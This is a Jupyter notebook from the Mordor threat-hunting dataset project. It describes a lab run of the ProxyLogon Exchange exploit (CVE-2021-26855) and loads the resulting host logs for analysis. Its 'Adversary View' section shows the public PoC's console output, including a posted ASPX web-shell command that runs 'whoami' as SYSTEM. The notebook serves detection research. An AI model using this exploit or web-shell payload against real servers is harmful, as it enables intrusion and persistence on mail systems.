{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "52a3fc84",
   "metadata": {},
   "source": [
    "# Exchange ProxyLogon SSRF RCE Vuln POC"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6cb90f3b",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "35fb26e9",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2021/03/14 |\n",
    "| Modification Date | 2021/03/14 |\n",
    "| Tactics           | ['[TA0003](https://attack.mitre.org/tactics/TA0003)', '[TA0002](https://attack.mitre.org/tactics/TA0002)'] |\n",
    "| Techniques        | ['[T1505.003](https://attack.mitre.org/techniques/T1505/003)'] |\n",
    "| Tags              | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "74f53d89",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents the execution of a public POC to abuse Exchange vulnerabilities (CVE-2021-26855 server-side request forgery (SSRF) vulnerability)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "015eaa55",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "121cdfc8",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/host/proxylogon_ssrf_rce_poc.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/host/proxylogon_ssrf_rce_poc.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dcc5ff01",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "193b83f6",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "186de2b6",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "21f6df0a",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Lab VM | Manual | [cmd](None) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "75682288",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "C:\\Users\\wardog.MXS01\\Documents>\n",
    "C:\\Users\\wardog.MXS01\\Documents>python public-poc.py localhost wardog@azsentinel.local\n",
    "Attacking target localhost\n",
    "=============================\n",
    "Got DN: /o=azsentinel/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=6beef80bd6d14a68b9ae39df7f27a8cc-wardog\n",
    "Got SID: S-1-5-21-594047938-393122191-2580508586-500\n",
    "Got session id: e243cd06-1093-40d4-829c-63f3b9caea9b\n",
    "Got canary: pYoEXlKOqkGQMt3Dv3qJUExebVlG6NgI3c_XeQNd-VRV8lo6E5zskoLPJB0uOOGITLTC08eVUkk.\n",
    "Got OAB id: becafe73-b0c1-4f36-8df4-85f682840ef4\n",
    "Ready!\n",
    "\n",
    "Testing command:\n",
    "===============\n",
    "POST  shell:https://localhost/owa/auth/ohyeah.aspx\n",
    "code\":\"Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"cmd /c whoami\").StdOut.ReadAll());\n",
    "\n",
    "\n",
    "[*] Waiting for ohyeah.aspx to be available..\n",
    "[*] Waiting for ohyeah.aspx to be available..\n",
    "\n",
    "Results:\n",
    "========\n",
    "nt authority\\system\n",
    "\n",
    "\n",
    "C:\\Users\\wardog.MXS01\\Documents>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "04f1b604",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "54666fd8",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e95ea01f",
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8f71c8f7",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7260df07",
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/host/proxylogon_ssrf_rce_poc.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4b7b24cd",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5c7fcfeb",
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
